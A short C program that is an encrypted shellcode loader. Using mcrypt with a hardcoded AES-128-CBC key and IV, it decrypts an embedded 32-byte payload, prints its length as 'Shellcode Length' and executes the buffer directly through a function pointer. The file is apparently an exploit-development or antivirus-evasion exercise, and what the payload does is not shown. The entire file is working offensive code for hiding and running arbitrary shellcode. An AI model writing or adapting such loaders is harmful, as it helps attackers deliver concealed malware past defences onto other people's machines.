#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/*
 * MCrypt API available online:
 * http://linux.die.net/man/3/mcrypt
 */
#include <mcrypt.h>

#include <math.h>
#include <stdint.h>
#include <stdlib.h>


int decrypt(
    void* buffer,
    int buffer_len,
    char* IV,
    char* key,
    int key_len
){
  MCRYPT td = mcrypt_module_open("rijndael-128", NULL, "cbc", NULL);
  int blocksize = mcrypt_enc_get_block_size(td);
  if( buffer_len % blocksize != 0 ){return 1;}
  mcrypt_generic_init(td, key, key_len, IV);
  mdecrypt_generic(td, buffer, buffer_len);
  mcrypt_generic_deinit (td); 
  mcrypt_module_close(td);
  return 0;
}

int main()
{
  MCRYPT td,td2;
  char* IV = "AAAAAAAAAAAAAAAA";
  char *key = "0123456789abcdef";
  int keysize = 16; /* 128 bits */
  unsigned char buffer[] = "\x5c\xd8\xcf\x9e\x8f\x3a\x9f\x52\x2e\x3d\x51\x06\x00\xde\xa6\x64\x45\x5f\x62\x53\x75\xab\xbd\xe1\x33\xc1\x69\xbf\xed\xc8\x5c\xaa"; 
  int buffer_len = 32;
  int counter; 
  decrypt(buffer, buffer_len, IV, key, keysize);
  printf("Shellcode Length:  %d\n", strlen(buffer));
  int (*ret)() = (int(*)())buffer;
  ret();


  return 0;
}
